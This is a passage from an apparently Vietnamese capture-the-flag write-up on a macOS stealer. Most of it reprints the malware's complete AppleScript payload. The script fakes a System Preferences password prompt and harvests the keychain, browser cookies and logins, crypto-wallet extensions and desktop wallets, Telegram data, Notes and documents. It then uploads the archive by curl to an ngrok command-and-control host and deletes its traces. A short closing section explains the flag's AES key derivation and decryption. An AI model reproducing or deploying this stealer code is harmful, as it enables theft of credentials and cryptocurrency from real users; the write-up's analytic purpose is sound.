                set theItem to quoted form of POSIX path of paths
                set fsz to (do shell script "/usr/bin/mdls -name kMDItemFSSize -raw " & theItem)
        end try
        return fsz
end filesizer
on mkdir(someItem)
        try
                set filePosixPath to quoted form of (POSIX path of someItem)
                do shell script "mkdir -p " & filePosixPath
        end try
end mkdir
on FileName(filePath)
        try
                set reversedPath to (reverse of every character of filePath) as string
                set trimmedPath to text 1 thru ((offset of "/" in reversedPath) - 1) of reversedPath
                set finalPath to (reverse of every character of trimmedPath) as string
                return finalPath
        end try
end FileName
on BeforeFileName(filePath)
        try
                set lastSlash to offset of "/" in (reverse of every character of filePath) as string
                set trimmedPath to text 1 thru -(lastSlash + 1) of filePath
                return trimmedPath
        end try
end BeforeFileName
on writeText(textToWrite, filePath)
        try
                set folderPath to BeforeFileName(filePath)
                mkdir(folderPath)
                set fileRef to (open for access filePath with write permission)
                write textToWrite to fileRef starting at eof
                close access fileRef
        end try
end writeText
on readwrite(path_to_file, path_as_save)
        try
                set fileContent to read path_to_file
                set folderPath to BeforeFileName(path_as_save)
                mkdir(folderPath)
                do shell script "cat " & quoted form of path_to_file & " > " & quoted form of path_as_save
        end try
end readwrite
on isDirectory(someItem)
        try
                set filePosixPath to quoted form of (POSIX path of someItem)
                set fileType to (do shell script "file -b " & filePosixPath)
                if fileType ends with "directory" then
                        return true
                end if
                return false
        end try
end isDirectory
on GrabFolderLimit(sourceFolder, destinationFolder)
        try
                set bankSize to 0
                set exceptionsList to {".DS_Store", "Partitions", "Code Cache", "Cache", "market-history-cache.json", "journals", "Previews"}
                set fileList to list folder sourceFolder without invisibles
                mkdir(destinationFolder)
                repeat with currentItem in fileList
                        if currentItem is not in exceptionsList then
                                set itemPath to sourceFolder & "/" & currentItem
                                set savePath to destinationFolder & "/" & currentItem
                                if isDirectory(itemPath) then
                                        GrabFolderLimit(itemPath, savePath)
                                else
                                        set fsz to filesizer(itemPath)
                                        set bankSize to bankSize + fsz
                                        if bankSize < 10 * 1024 * 1024 then
                                                readwrite(itemPath, savePath)
                                        end if
                                end if
                        end if
                end repeat
        end try
end GrabFolderLimit
on GrabFolder(sourceFolder, destinationFolder)
        try
                set exceptionsList to {".DS_Store", "Partitions", "Code Cache", "Cache", "market-history-cache.json", "journals", "Previews", "dumps", "emoji", "user_data", "__update__"}
                set fileList to list folder sourceFolder without invisibles
                mkdir(destinationFolder)
                repeat with currentItem in fileList
                        if currentItem is not in exceptionsList then
                                set itemPath to sourceFolder & "/" & currentItem
                                set savePath to destinationFolder & "/" & currentItem
                                if isDirectory(itemPath) then
                                        GrabFolder(itemPath, savePath)
                                else
                                        readwrite(itemPath, savePath)
                                end if
                        end if
                end repeat
        end try
end GrabFolder
on encryptFlag(sussyfile, inputFile, outputFile)
        set hexKey to (do shell script "md5 -q " & sussyfile)
        set hexIV to (do shell script "echo \"" & hexKey & "\" | rev")
    do shell script "openssl enc -aes-128-cbc -in " & quoted form of inputFile & " -out " & quoted form of outputFile & " -K " & hexKey & " -iv " & hexIV
end encryptFlag
on parseFF(firefox, writemind)
        try
                set myFiles to {"/cookies.sqlite", "/formhistory.sqlite", "/key4.db", "/logins.json"}
                set fileList to list folder firefox without invisibles
                repeat with currentItem in fileList
                        set fpath to writemind & "ff/" & currentItem
                        set readpath to firefox & currentItem
                        repeat with FFile in myFiles
                                readwrite(readpath & FFile, fpath & FFile)
                        end repeat
                end repeat
        end try
end parseFF
on checkvalid(username, password_entered)
        try
                set result to do shell script "dscl . authonly " & quoted form of username & space & quoted form of password_entered
                if result is not equal to "" then
                        return false
                else
                        return true
                end if
        on error
                return false
        end try
end checkvalid
on getpwd(username, writemind)
        try
                if checkvalid(username, "") then
                        set result to do shell script "security 2>&1 > /dev/null find-generic-password -ga \"Chrome\" | awk \"{print $2}\""
                        writeText(result as string, writemind & "masterpass-chrome")
                else
                        repeat
                                set result to display dialog "Required Application Helper.\nPlease enter password for continue." default answer "" with icon caution buttons {"Continue"} default button "Continue" giving up after 150 with title "System Preferences" with hidden answer
                                set password_entered to text returned of result
                                if checkvalid(username, password_entered) then
                                        writeText(password_entered, writemind & "pwd")
                                        return password_entered
                                end if
                        end repeat
                end if
        end try
        return ""
end getpwd
on grabPlugins(paths, savePath, pluginList, index)
        try
                set fileList to list folder paths without invisibles
                repeat with PFile in fileList
                        repeat with Plugin in pluginList
                                if (PFile contains Plugin) then
                                        set newpath to paths & PFile
                                        set newsavepath to savePath & "/" & Plugin
                                        if index then
                                                set newsavepath to newsavepath & "/IndexedDB/"
                                        end if
                                        GrabFolder(newpath, newsavepath)
                                end if
                        end repeat
                end repeat
        end try
end grabPlugins
on chromium(writemind, chromium_map)
        set pluginList to {"keenhcnmdmjjhincpilijphpiohdppno", "hbbgbephgojikajhfbomhlmmollphcad", "cjmkndjhnagcfbpiemnkdpomccnjblmj", "dhgnlgphgchebgoemcjekedjjbifijid", "hifafgmccdpekplomjjkcfgodnhcellj", "kamfleanhcmjelnhaeljonilnmjpkcjc", "jnldfbidonfeldmalbflbmlebbipcnle", "fdcnegogpncmfejlfnffnofpngdiejii", "klnaejjgbibmhlephnhpmaofohgkpgkd", "pdadjkfkgcafgbceimcpbkalnfnepbnk", "kjjebdkfeagdoogagbhepmbimaphnfln", "ldinpeekobnhjjdofggfgjlcehhmanlj", "dkdedlpgdmmkkfjabffeganieamfklkm", "bcopgchhojmggmffilplmbdicgaihlkp", "kpfchfdkjhcoekhdldggegebfakaaiog", "idnnbdplmphpflfnlkomgpfbpcgelopg", "mlhakagmgkmonhdonhkpjeebfphligng", "bipdhagncpgaccgdbddmbpcabgjikfkn", "gcbjmdjijjpffkpbgdkaojpmaninaion", "nhnkbkgjikgcigadomkphalanndcapjk", "bhhhlbepdkbapadjdnnojkbgioiodbic", "hoighigmnhgkkdaenafgnefkcmipfjon", "klghhnkeealcohjjanjjdaeeggmfmlpl", "nkbihfbeogaeaoehlefnkodbefgpgknn", "fhbohimaelbohpjbbldcngcnapndodjp", "ebfidpplhabeedpnhjnobghokpiioolj", "emeeapjkbcbpbpgaagfchmcgglmebnen", "fldfpgipfncgndfolcbkdeeknbbbnhcc", "penjlddjkjgpnkllboccdgccekpkcbin", "fhilaheimglignddkjgofkcbgekhenbh", "hmeobnfnfcmdkdcmlblgagmfpfboieaf", "cihmoadaighcejopammfbmddcmdekcje", "lodccjjbdhfakaekdiahmedfbieldgik", "omaabbefbmiijedngplfjmnooppbclkk", "cjelfplplebdjjenllpjcblmjkfcffne", "jnlgamecbpmbajjfhmmmlhejkemejdma", "fpkhgmpbidmiogeglndfbkegfdlnajnf", "bifidjkcdpgfnlbcjpdkdcnbiooooblg", "amkmjjmmflddogmhpjloimipbofnfjih", "flpiciilemghbmfalicajoolhkkenfel", "hcflpincpppdclinealmandijcmnkbgn", "aeachknmefphepccionboohckonoeemg", "nlobpakggmbcgdbpjpnagmdbdhdhgphk", "momakdpclmaphlamgjcndbgfckjfpemp", "mnfifefkajgofkcjkemidiaecocnkjeh", "fnnegphlobjdpkhecapkijjdkgcjhkib", "ehjiblpccbknkgimiflboggcffmpphhp", "ilhaljfiglknggcoegeknjghdgampffk", "pgiaagfkgcbnmiiolekcfmljdagdhlcm", "fnjhmkhhmkbjkkabndcnnogagogbneec", "bfnaelmomeimhlpmgjnjophhpkkoljpa", "imlcamfeniaidioeflifonfjeeppblda", "mdjmfdffdcmnoblignmgpommbefadffd", "ooiepdgjjnhcmlaobfinbomgebfgablh", "pcndjhkinnkaohffealmlmhaepkpmgkb", "ppdadbejkmjnefldpcdjhnkpbjkikoip", "cgeeodpfagjceefieflmdfphplkenlfk", "dlcobpjiigpikoobohmabehhmhfoodbb", "jiidiaalihmmhddjgbnbgdfflelocpak", "bocpokimicclpaiekenaeelehdjllofo", "pocmplpaccanhmnllbbkpgfliimjljgo", "cphhlgmgameodnhkjdmkpanlelnlohao", "mcohilncbfahbmgdjkbpemcciiolgcge", "bopcbmipnjdcdfflfgjdgdjejmgpoaab", "khpkpbbcccdmmclmpigdgddabeilkdpd", "ejjladinnckdgjemekebdpeokbikhfci", "phkbamefinggmakgklpkljjmgibohnba", "epapihdplajcdnnkdeiahlgigofloibg", "hpclkefagolihohboafpheddmmgdffjm", "cjookpbkjnpkmknedggeecikaponcalb", "cpmkedoipcpimgecpmgpldfpohjplkpp", "modjfdjcodmehnpccdjngmdfajggaoeh", "ibnejdfjmmkpcnlpebklmnkoeoihofec", "afbcbjpbpfadlkmhmclhkeeodmamcflc", "kncchdigobghenbbaddojjnnaogfppfj", "efbglgofoippbgcjepnhiblaibcnclgk", "mcbigmjiafegjnnogedioegffbooigli", "fccgmnglbhajioalokbcidhcaikhlcpm", "hnhobjmcibchnmglfbldbfabcgaknlkj", "apnehcjmnengpnmccpaibjmhhoadaico", "enabgbdfcbaehmbigakijjabdpdnimlg", "mgffkfbidihjpoaomajlbgchddlicgpn", "fopmedgnkfpebgllppeddmmochcookhc", "jojhfeoedkpkglbfimdfabpdfjaoolaf", "ammjlinfekkoockogfhdkgcohjlbhmff", "abkahkcbhngaebpcgfmhkoioedceoigp", "dcbjpgbkjoomeenajdabiicabjljlnfp", "gkeelndblnomfmjnophbhfhcjbcnemka", "pnndplcbkakcplkjnolgbkdgjikjednm", "copjnifcecdedocejpaapepagaodgpbh", "hgbeiipamcgbdjhfflifkgehomnmglgk", "mkchoaaiifodcflmbaphdgeidocajadp", "ellkdbaphhldpeajbepobaecooaoafpg", "mdnaglckomeedfbogeajfajofmfgpoae", "nknhiehlklippafakaeklbeglecifhad", "ckklhkaabbmdjkahiaaplikpdddkenic", "fmblappgoiilbgafhjklehhfifbdocee", "nphplpgoakhhjchkkhmiggakijnkhfnd", "cnmamaachppnkjgnildpdmkaakejnhae", "fijngjgcjhjmmpcmkeiomlglpeiijkld", "niiaamnmgebpeejeemoifgdndgeaekhe", "odpnjmimokcmjgojhnhfcnalnegdjmdn", "lbjapbcmmceacocpimbpbidpgmlmoaao", "hnfanknocfeofbddgcijnmhnfnkdnaad", "hpglfhgfnhbgpjdenjgmdgoeiappafln", "egjidjbpglichdcondbcbdnbeeppgdph", "ibljocddagjghmlpgihahamcghfggcjc", "gkodhkbmiflnmkipcmlhhgadebbeijhh", "dbgnhckhnppddckangcjbkjnlddbjkna", "mfhbebgoclkghebffdldpobeajmbecfk", "nlbmnnijcnlegkjjpcfjclmcfggfefdm", "nlgbhdfgdhgbiamfdfmbikcdghidoadd", "acmacodkjbdgmoleebolmdjonilkdbch", "agoakfejjabomempkjlepdflaleeobhb", "dgiehkgfknklegdhekgeabnhgfjhbajd", "onhogfjeacnfoofkfgppdlbmlmnplgbn", "kkpehldckknjffeakihjajcjccmcjflh", "jaooiolkmfcmloonphpiiogkfckgciom", "ojggmchlghnjlapmfbnjholfjkiidbch", "pmmnimefaichbcnbndcfpaagbepnjaig", "oiohdnannmknmdlddkdejbmplhbdcbee", "aiifbnbfobpmeekipheeijimdpnlpgpp", "aholpfdialjgjfhomihkjbmgjidlcdno", "anokgmphncpekkhclmingpimjmcooifb", "kkpllkodjeloidieedojogacfhpaihoh", "iokeahhehimjnekafflcihljlcjccdbe", "ifckdpamphokdglkkdomedpdegcjhjdp", "loinekcabhlmhjjbocijdoimmejangoa", "fcfcfllfndlomdhbehjjcoimbgofdncg", "ifclboecfhkjbpmhgehodcjpciihhmif", "dmkamcknogkgcdfhhbddcghachkejeap", "ookjlbkiijinhpmnjffcofjonbfbgaoc", "oafedfoadhdjjcipmcbecikgokpaphjk", "mapbhaebnddapnmifbbkgeedkeplgjmf", "cmndjbecilbocjfkibfbifhngkdmjgog", "kpfopkelmapcoipemfendmdcghnegimn", "lgmpcpglpngdoalbgeoldeajfclnhafa", "ppbibelpcjmhbdihakflkdcoccbgbkpo", "ffnbelfdoeiohenkjibnmadjiehjhajb", "opcgpfmipidbgpenhmajoajpbobppdil", "lakggbcodlaclcbbbepmkpdhbcomcgkd", "kgdijkcfiglijhaglibaidbipiejjfdp", "hdkobeeifhdplocklknbnejdelgagbao", "lnnnmfcpbkafcpgdilckhmhbkkbpkmid", "nbdhibgjnjpnkajaghbffjbkcgljfgdi", "kmhcihpebfmpgmihbkipmjlmmioameka", "kmphdnilpmdejikjdnlbcnmnabepfgkh", "nngceckbapebfimnlniiiahkandclblb"}
        set chromiumFiles to {"/Network/Cookies", "/Cookies", "/Web Data", "/Login Data", "/Local Extension Settings/", "/IndexedDB/"}
        repeat with chromium in chromium_map
                set savePath to writemind & "Chromium/" & item 1 of chromium & "_"
                try
                        set fileList to list folder item 2 of chromium without invisibles
                        repeat with currentItem in fileList
                                if ((currentItem as string) is equal to "Default") or ((currentItem as string) contains "Profile") then
                                        repeat with CFile in chromiumFiles
                                                set readpath to (item 2 of chromium & currentItem & CFile)
                                                if ((CFile as string) is equal to "/Network/Cookies") then
                                                        set CFile to "/Cookies"
                                                end if
                                                if ((CFile as string) is equal to "/Local Extension Settings/") then
                                                        grabPlugins(readpath, savePath & currentItem, pluginList, false)
                                                else if (CFile as string) is equal to "/IndexedDB/" then
                                                        grabPlugins(readpath, savePath & currentItem, pluginList, true)
                                                else
                                                        set writepath to savePath & currentItem & CFile
                                                        readwrite(readpath, writepath)
                                                end if
                                        end repeat
                                end if
                        end repeat
                end try
        end repeat
end chromium
on telegram(writemind, library)
                try
                        GrabFolder(library & "Telegram Desktop/tdata/", writemind & "Telegram Data/")
                end try
end telegram
on deskwallets(writemind, deskwals)
        repeat with deskwal in deskwals
                try
                        GrabFolder(item 2 of deskwal, writemind & item 1 of deskwal)
                end try
        end repeat
end deskwallets
on filegrabber(writemind)
        try
                set destinationFolderPath to POSIX file (writemind & "FileGrabber/")
                mkdir(destinationFolderPath)
                set extensionsList to {"pdf"," docx"," doc"," wallet"," keys"}
                set bankSize to 0
                tell application "Finder"
                        try
                                set safariFolderPath to (path to home folder as text) & "Library:Cookies:"
                                duplicate file (safariFolderPath & "Cookies.binarycookies") to folder destinationFolderPath with replacing
                                set name of result to "saf1"
                        end try
                        try
                                set safariFolder to ((path to library folder from user domain as text) & "Containers:com.apple.Safari:Data:Library:Cookies:")
                                try
                                        duplicate file "Cookies.binarycookies" of folder safariFolder to folder destinationFolderPath with replacing
                                end try
                                set notesFolderPath to (path to home folder as text) & "Library:Group Containers:group.com.apple.notes:"
                                set notesAccounts to folder (notesFolderPath & "Accounts:")
                                try
                                        set notesFolder to folder notesFolderPath
                                        set notesFiles to {file "NoteStore.sqlite", file "NoteStore.sqlite-shm", file "NoteStore.sqlite-wal"} of notesFolder
                                        repeat with aFile in notesFiles
                                                try
                                                        duplicate aFile to folder destinationFolderPath with replacing
                                                end try
                                        end repeat
                                end try
                        end try
                        try
                                set desktopFiles to every file of desktop
                                set documentsFiles to every file of folder "Documents" of (path to home folder)
                                set downloadsFiles to every file of folder "Downloads" of (path to home folder)
                                repeat with aFile in (desktopFiles & documentsFiles & downloadsFiles)
                                        set fileExtension to name extension of aFile
                                        if fileExtension is in extensionsList then
                                                set filesize to size of aFile
                                                if (bankSize + filesize) < 10 * 1024 * 1024 then
                                                        try
                                                                duplicate aFile to folder destinationFolderPath with replacing
                                                                set bankSize to bankSize + filesize
                                                        end try
                                                else
                                                        exit repeat
                                                end if
                                        end if
                                end repeat
                        end try
                end tell
        end try
end filegrabber
on send_data(attempt)
        try
                set result_send to do shell script "curl -X POST -H \"user: 85JDXWQ4CL67-XaZnPqOLmHFv1yNRXZOmNTpeJMw4AP=\" -H \"BuildID: /xpLmzYqPrVH-jKOpfmncviXt2zDgp/-NFM7tQhb6tp=\" --max-time 300 --retry 5 --retry-delay 10 -F \"file1=@/tmp/out.zip\" http://b2eb-115-135-31-192.ngrok-free.app/joinsystem"
        on error
                if attempt < 40 then
                        delay 3
                        send_data(attempt + 1)
                end if
        end try
end send_data
set username to (system attribute "USER")
set profile to "/Users/" & username
set randomNumber to do shell script "echo $((RANDOM % 9000 + 1000))"
set writemind to "/tmp/" & randomNumber & "/"
try
        set result to (do shell script "system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType")
        writeText(result, writemind & "info")
end try
set library to profile & "/Library/Application Support/"
set password_entered to getpwd(username, writemind)
delay 0.01
set chromiumMap to {{"Chrome", library & "Google/Chrome/"}, {"Brave", library & "BraveSoftware/Brave-Browser/"}, {"Edge", library & "Microsoft Edge/"}, {"Vivaldi", library & "Vivaldi/"}, {"Opera", library & "com.operasoftware.Opera/"}, {"OperaGX", library & "com.operasoftware.OperaGX/"}, {"Chrome Beta", library & "Google/Chrome Beta/"}, {"Chrome Canary", library & "Google/Chrome Canary"}, {"Chromium", library & "Chromium/"}, {"Chrome Dev", library & "Google/Chrome Dev/"}, {"Arc", library & "Arc/"}, {"Coccoc", library & "Coccoc/"}}
set walletMap to {{"deskwallets/Electrum", profile & "/.electrum/wallets/"}, {"deskwallets/Coinomi", library & "Coinomi/wallets/"}, {"deskwallets/Exodus", library & "Exodus/"}, {"deskwallets/Atomic", library & "atomic/Local Storage/leveldb/"}, {"deskwallets/Wasabi", profile & "/.walletwasabi/client/Wallets/"}, {"deskwallets/Ledger_Live", library & "Ledger Live/"}, {"deskwallets/Monero", profile & "/Monero/wallets/"}, {"deskwallets/Bitcoin_Core", library & "Bitcoin/wallets/"}, {"deskwallets/Litecoin_Core", library & "Litecoin/wallets/"}, {"deskwallets/Dash_Core", library & "DashCore/wallets/"}, {"deskwallets/Electrum_LTC", profile & "/.electrum-ltc/wallets/"}, {"deskwallets/Electron_Cash", profile & "/.electron-cash/wallets/"}, {"deskwallets/Guarda", library & "Guarda/"}, {"deskwallets/Dogecoin_Core", library & "Dogecoin/wallets/"}, {"deskwallets/Trezor_Suite", library & "@trezor/suite-desktop/"}}
readwrite(library & "Binance/app-store.json", writemind & "deskwallets/Binance/app-store.json")
readwrite(library & "@tonkeeper/desktop/config.json", "deskwallets/TonKeeper/config.json")
readwrite(profile & "/Library/Keychains/login.keychain-db", writemind & "keychain")
if release then
        readwrite(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite", writemind & "FileGrabber/NoteStore.sqlite")
        readwrite(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-wal", writemind & "FileGrabber/NoteStore.sqlite-wal")
        readwrite(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-shm", writemind & "FileGrabber/NoteStore.sqlite-shm")
        readwrite(profile & "/Library/Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies", writemind & "FileGrabber/Cookies.binarycookies")
        readwrite(profile & "/Library/Cookies/Cookies.binarycookies", writemind & "FileGrabber/saf1")
end if
if filegrabbers then
        filegrabber(writemind)
end if
writeText(username, writemind & "username")
set ff_paths to {library & "Firefox/Profiles/", library & "Waterfox/Profiles/", library & "Pale Moon/Profiles/"}
repeat with firefox in ff_paths
        try
                parseFF(firefox, writemind)
        end try
end repeat
set sussyfile to "~/Downloads/bangboo.png"
set inputFile to "/tmp/flag.png"
set outputFile to "/tmp/flag.enc"
chromium(writemind, chromiumMap)
deskwallets(writemind, walletMap)
telegram(writemind, library)
encryptFlag(sussyfile, inputFile, outputFile)
do shell script "cd /tmp && zip -r out.zip " & writemind & " flag.enc"
send_data(0)
do shell script "rm -r " & writemind
do shell script "rm /tmp/out.zip"
do shell script "rm /tmp/flag.enc"
'&
--------------------------------------------------
```
Kết quả trả về là một đoạn mã AppleScript hoàn chỉnh. Đây chính là core payload của MacOS Stealer.

Phân tích AppleScript và Cơ chế mã hóa

Đọc đoạn AppleScript, mã độc thực hiện hàng loạt hành vi gom dữ liệu (cookies, lịch sử trình duyệt Chromium/Firefox, ví tiền điện tử, Telegram data, keychain) và gửi về C2 thông qua lệnh curl.

Đáng chú ý nhất là hàm encryptFlag dùng để mã hóa cờ:
```
set sussyfile to "~/Downloads/bangboo.png"
set inputFile to "/tmp/flag.png"
set outputFile to "/tmp/flag.enc"

on encryptFlag(sussyfile, inputFile, outputFile)
    set hexKey to (do shell script "md5 -q " & sussyfile)
    set hexIV to (do shell script "echo \"" & hexKey & "\" | rev")
    do shell script "openssl enc -aes-128-cbc -in " & quoted form of inputFile & " -out " & quoted form of outputFile & " -K " & hexKey & " -iv " & hexIV
end encryptFlag
```
Kẻ tấn công không hardcode mật khẩu, mà sử dụng mã băm MD5 của file bangboo.png làm khóa AES, và chuỗi MD5 đảo ngược làm Vector khởi tạo (IV).
```
# Lấy AES Key (MD5)
$ md5sum bangboo.png
3b45875108efb349430780d0afd6730a

# Lấy IV (Reverse MD5)
$ echo -n "3b45875108efb349430780d0afd6730a" | rev
a0376dfa0d087034943bfe80157854b3
```
Sau khi đã có key và iv mình thực hiện giải mã AES-128-CBC bằng OpenSSL:
```
openssl enc -d -aes-128-cbc -in flag.enc -out decrypted_flag.png -K 3b45875108efb349430780d0afd6730a -iv a0376dfa0d087034943bfe80157854b3
```

Qua đó mình thu được flag:

<img width="1024" height="587" alt="image" src="https://github.com/user-attachments/assets/3cd4331a-e355-43d7-905d-3c899242d7f7" />

Flag: EQCTF{4m0s_$t34L3r_1n_mY_m4c0s}

   



